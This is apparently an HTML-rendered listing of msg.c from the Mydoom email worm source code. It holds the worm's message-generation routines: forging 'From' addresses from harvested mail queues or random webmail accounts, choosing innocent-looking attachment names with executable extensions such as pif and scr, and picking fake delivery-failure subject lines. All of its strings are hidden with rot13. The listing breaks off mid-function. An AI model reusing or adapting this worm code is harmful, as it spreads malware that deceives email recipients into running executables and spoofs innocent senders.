<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Mydoom.a - msg.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
 *  Sync's message generator
 */</span><span class="sc0">
</span><span class="sc9">#define WIN32_LEAN_AND_MEAN
#include &lt;windows.h&gt;
#include "lib.h"
#include "msg.h"
#include "zipstore.h"
#include "massmail.h"
</span><span class="sc0">
</span><span class="sc1">/* state structure */</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">exe_name</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">exe_ext</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">zip_used</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">zip_nametrick</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">is_tempfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">attach_name</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">attach_file</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">attach_size</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* in bytes */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mime_boundary</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">buffer_size</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* FIXME: must check "To:" != "From:" */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">select_from</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">step3_domains</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* "aol.com", "msn.com", "yahoo.com", "hotmail.com" */</span><span class="sc0">
        </span><span class="sc6">"nby.pbz"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"zfa.pbz"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lnubb.pbz"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ubgznvy.pbz"</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* STEP1 */</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">98</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">++);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand32</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* STEP 2: use any Outlook account. Not implemented yet. */</span><span class="sc0">

    </span><span class="sc1">/* STEP 3 */</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc1">/* username length; 3-5 chars */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'a'</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">26</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">step3_domains</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">step3_domains</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">step3_domains</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">select_exename</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"qbphzrag"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ernqzr"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"qbp"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"grkg"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"svyr"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"qngn"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"grfg"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">17</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"zrffntr"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">17</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"obql"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ext</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cvs"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fpe"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rkr"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pzq"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ong"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'a'</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">26</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tot</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_ext</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">exts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ext</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s.%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">exe_ext</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">select_subject</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subj</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">subjs</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">35</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"grfg"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">35</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"uv"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">35</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"uryyb"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Znvy Qryvirel Flfgrz"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Znvy Genafnpgvba Snvyrq"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Freire Ercbeg"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Fgnghf"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Reebe"</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tot</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
